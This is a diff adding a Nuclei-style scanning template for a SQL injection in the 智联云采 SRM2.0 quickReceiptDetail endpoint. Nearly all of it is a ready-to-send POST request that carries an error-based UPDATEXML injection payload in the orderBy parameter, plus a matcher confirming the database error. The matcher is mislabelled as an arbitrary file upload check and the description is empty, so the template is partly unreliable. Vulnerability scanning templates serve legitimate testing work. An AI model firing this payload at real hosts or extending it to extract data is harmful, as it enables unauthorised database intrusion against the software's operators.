@@ -1,0 +1,25 @@
+id: zhilianyuncai-SRM2-quickReceiptDetail-sql
+
+info:
+  name: 智联云采 SRM2.0 quickReceiptDetail SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /adpweb/api/srm/delivery/quickReceiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'qpzvq1qvjvq','XPATH syntax error:')"
